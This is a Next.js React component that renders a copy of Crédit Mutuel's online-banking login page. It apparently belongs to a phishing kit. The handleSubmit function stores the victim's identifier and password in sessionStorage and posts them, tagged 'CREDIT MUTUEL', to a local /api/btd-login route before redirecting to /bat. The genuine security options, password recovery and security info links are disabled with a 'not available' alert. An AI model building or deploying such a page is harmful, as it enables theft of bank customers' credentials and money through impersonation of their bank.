'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface CMConnexionProps {
  partnerLogoSrc?: string;
  cmLogoSrc?: string;
}

export default function CMConnexionPage({
  partnerLogoSrc = '/flavicon.ico',
  cmLogoSrc = '/unnamed.jpg',
}: CMConnexionProps) {
  const router = useRouter();

  const [clientId, setClientId] = useState<string>('');
  const [secretCode, setSecretCode] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  const isValid = clientId.trim().length >= 5 && secretCode.trim().length >= 4;

  const handleLockAction = (e: React.MouseEvent) => {
    e.preventDefault();
    alert('Non disponible dans ce guichet');
  };

// Soumission vers /api/btd-login et redirection vers /bat
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'CREDIT MUTUEL',
      identifiant: clientId,
      secret_code: secretCode,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };
  return (
    <>
      <style>{`
        .cm-body-wrapper {
          font-family: 'Open Sans', system-ui, -apple-system, sans-serif;
          background-color: #f7f9fa;
          color: #1a202c;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .cm-app-container {
          width: 100%;
          max-width: 450px;
          background-color: #f7f9fa;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          position: relative;
        }
        .cm-navbar {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 14px 16px;
          background: #ffffff;
          border-bottom: 1px solid #e2e8f0;
          height: 65px;
        }
        .cm-nav-left {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .cm-header-logo-size {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        /* Dimensions strictement identiques pour les deux logos */
        .cm-partner-logo,
        .cm-main-logo {
          width: 40px !important;
          height: 40px !important;
          min-width: 40px !important;
          min-height: 40px !important;
          max-width: 40px !important;
          max-height: 40px !important;
          object-fit: contain;
          display: block;
        }

        .cm-logo-sep {
          color: #a0aec0;
          font-size: 16px;
          font-weight: 600;
        }

        .cm-nav-right {
          display: flex;
          align-items: center;
          gap: 14px;
        }
        .cm-nav-icon-btn {
          background: transparent;
          border: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          width: 36px;
          height: 36px;
        }
        .border-circle {
          border: 1px solid #e2e8f0;
          border-radius: 50%;
        }
        .cm-svg-icon {
          width: 22px;
          height: 22px;
        }
        .icon-blue { fill: #0066cc; }
        .icon-grey { fill: #718096; }

        .cm-container-fluid {
          padding: 20px 16px;
          flex-grow: 1;
          display: flex;
          flex-direction: column;
        }
        .cm-page-title {
          font-size: 24px;
          font-weight: 700;
          color: #003366;
          text-align: center;
          margin: 15px 0 25px 0;
        }
        .cm-login-card {
          background: #ffffff;
          border-radius: 8px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
          border: 1px solid #e2e8f0;
          overflow: hidden;
          margin-bottom: 25px;
        }
        .cm-tab-item {
          padding: 16px;
          border-bottom: 1px solid #edf2f7;
          display: flex;
          align-items: center;
          position: relative;
        }
        .cm-tab-active {
          border-left: 4px solid #0055a4;
          background-color: #ffffff;
        }
        .cm-tab-text {
          font-size: 15px;
          font-weight: 700;
          color: #0055a4;
        }
        .cm-tab-disabled {
          background-color: #fafafa;
          cursor: pointer;
          user-select: none;
        }
        .cm-tab-text-disabled {
          font-size: 15px;
          font-weight: 400;
          color: #a0aec0;
          display: flex;
          justify-content: space-between;
          width: 100%;
        }
        .cm-badge-lock {
          font-size: 11px;
          background: #edf2f7;
          color: #718096;
          padding: 2px 8px;
          border-radius: 4px;
          font-weight: 600;
        }
        .cm-card-body-form {
          padding: 24px 20px;
        }
        .cm-form-row {
          margin-bottom: 20px;
        }
        .cm-field-label {
          display: block;
          font-size: 14px;
          font-weight: 700;
          color: #2d3748;
          margin-bottom: 8px;
        }
        .cm-required {
          color: #e53e3e;
          margin-left: 2px;
        }
        .cm-input-container {
          position: relative;
          display: flex;
          align-items: center;
        }
        .cm-input-container input {
          width: 100%;
          padding: 14px 12px;
          font-size: 15px;
          border: 1px solid #cbd5e0;
          border-radius: 6px;
          outline: none;
          color: #1a202c;
          background-color: #ffffff;
          transition: border-color 0.2s;
        }
        .cm-input-container input:focus {
          border-color: #0055a4;
        }
        .cm-password-toggle {
          position: absolute;
          right: 12px;
          background: transparent;
          border: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 4px;
        }
        .cm-password-toggle svg {
          width: 22px;
          height: 22px;
          fill: #718096;
        }
        .cm-btn-submit-primary {
          width: 100%;
          padding: 15px;
          background-color: #cbd5e0;
          color: #ffffff;
          border: none;
          border-radius: 30px;
          font-size: 16px;
          font-weight: 700;
          cursor: not-allowed;
          transition: all 0.2s ease;
          text-align: center;
          margin-top: 10px;
        }
        .cm-btn-ready {
          background-color: #0055a4 !important;
          color: #ffffff !important;
          cursor: pointer !important;
        }
        .cm-card-subfooter {
          border-top: 1px solid #edf2f7;
          padding: 16px 20px;
          background: #fafafa;
          text-align: center;
        }
        .cm-link-with-arrow {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          font-size: 14px;
          font-weight: 600;
          color: #0055a4;
          text-decoration: none;
          cursor: pointer;
          opacity: 0.85;
        }
        .cm-arrow-symbol {
          font-size: 12px;
        }
        .cm-external-footer-zone {
          text-align: center;
          margin-top: auto;
          padding: 20px 0;
        }
        .text-medium-blue {
          color: #0055a4;
        }
      `}</style>

      <div className="cm-body-wrapper">
        <div className="cm-app-container">
          {/* Header avec logos aux dimensions strictement identiquement calibrées */}
          <header className="cm-navbar">
            <div className="cm-nav-left">
              <div className="cm-header-logo-size">
                <img src={partnerLogoSrc} alt="Favicon" className="cm-partner-logo" />
                <span className="cm-logo-sep">→</span>
                <img src={cmLogoSrc} alt="Crédit Mutuel" className="cm-main-logo" />
              </div>
            </div>
            <div className="cm-nav-right">
              <button
                className="cm-nav-icon-btn"
                type="button"
                onClick={() => router.back()}
              >
                <svg viewBox="0 0 24 24" className="cm-svg-icon icon-blue">
                  <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
                </svg>
              </button>
              <button
                className="cm-nav-icon-btn border-circle"
                type="button"
                onClick={handleLockAction}
              >
                <svg viewBox="0 0 24 24" className="cm-svg-icon icon-grey">
                  <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
                </svg>
              </button>
            </div>
          </header>

          <main className="cm-container-fluid">
            <h1 className="cm-page-title">Se connecter</h1>

            <div className="cm-login-card">
              <div className="cm-tab-item cm-tab-active">
                <span className="cm-tab-text">Identifiant / Mot de passe</span>
              </div>

              <div className="cm-tab-item cm-tab-disabled" onClick={handleLockAction}>
                <div className="cm-tab-text-disabled">
                  <span>Certificat Électronique</span>
                  <span className="cm-badge-lock">Non dispo</span>
                </div>
              </div>

              <div className="cm-tab-item cm-tab-disabled" onClick={handleLockAction}>
                <div className="cm-tab-text-disabled">
                  <span>SAFETRANS</span>
                  <span className="cm-badge-lock">Non dispo</span>
                </div>
              </div>

              <form onSubmit={handleSubmit} className="cm-card-body-form">
                <div className="cm-form-row">
                  <label className="cm-field-label" htmlFor="cm-userid">
                    Identifiant <span className="cm-required">*</span>
                  </label>
                  <div className="cm-input-container">
                    <input
                      type="text"
                      id="cm-userid"
                      placeholder="Votre identifiant"
                      value={clientId}
                      onChange={(e) => setClientId(e.target.value)}
                      autoComplete="off"
                    />
                  </div>
                </div>

                <div className="cm-form-row">
                  <label className="cm-field-label" htmlFor="cm-password">
                    Mot de passe <span className="cm-required">*</span>
                  </label>
                  <div className="cm-input-container">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="cm-password"
                      placeholder="Votre mot de passe"
                      value={secretCode}
                      onChange={(e) => setSecretCode(e.target.value)}
                      autoComplete="off"
                    />
                    <button
                      type="button"
                      className="cm-password-toggle"
                      onClick={() => setShowPassword((prev) => !prev)}
                      tabIndex={-1}
                    >
                      <svg
                        viewBox="0 0 24 24"
                        style={{ opacity: showPassword ? 0.4 : 1 }}
                      >
                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.82l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.74-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" />
                      </svg>
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={!isValid || isSubmitting}
                  className={`cm-btn-submit-primary ${isValid && !isSubmitting ? 'cm-btn-ready' : ''}`}
                >
                  {isSubmitting ? 'Connexion...' : 'Se connecter'}
                </button>
              </form>

              <footer className="cm-card-subfooter">
                <a
                  href="#"
                  className="cm-link-with-arrow"
                  onClick={handleLockAction}
                >
                  <span>Codes d'accès oubliés</span>
                  <span className="cm-arrow-symbol">➔</span>
                </a>
              </footer>
            </div>

            <div className="cm-external-footer-zone">
              <a
                href="#"
                className="cm-link-with-arrow text-medium-blue"
                onClick={handleLockAction}
              >
                <span>Infos sécurité</span>
                <span className="cm-arrow-symbol">➔</span>
              </a>
            </div>
          </main>
        </div>
      </div>
    </>
  );
}